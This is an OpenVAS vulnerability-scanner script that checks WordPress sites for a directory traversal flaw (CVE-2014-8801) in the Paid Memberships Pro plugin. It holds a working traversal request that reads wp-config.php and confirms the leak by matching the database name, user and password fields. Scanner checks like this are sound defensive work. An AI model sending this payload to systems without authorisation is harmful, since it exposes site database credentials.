###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_paid_memberships_pro_dir_trav_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# Wordpress Paid Memberships Pro Directory Traversal Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805106");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2014-8801");
  script_bugtraq_id(71293);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-27 15:32:20 +0530 (Thu, 27 Nov 2014)");
  script_name("Wordpress Paid Memberships Pro Directory Traversal Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with WordPress
  Paid Memberships Pro plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Flaw exists as the 'REQUEST_URI' is not
  escaped and getfile.php is accessible to everyone.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files.");

  script_tag(name:"affected", value:"WordPress Paid Memberships Pro version
  1.7.14, prior versions may also be affected.");

  script_tag(name:"solution", value:"Upgrade to version 1.7.15 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35303");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/paid-memberships-pro/changelog");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_app");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
{
  security_message(port:http_port);
  exit(0);
}
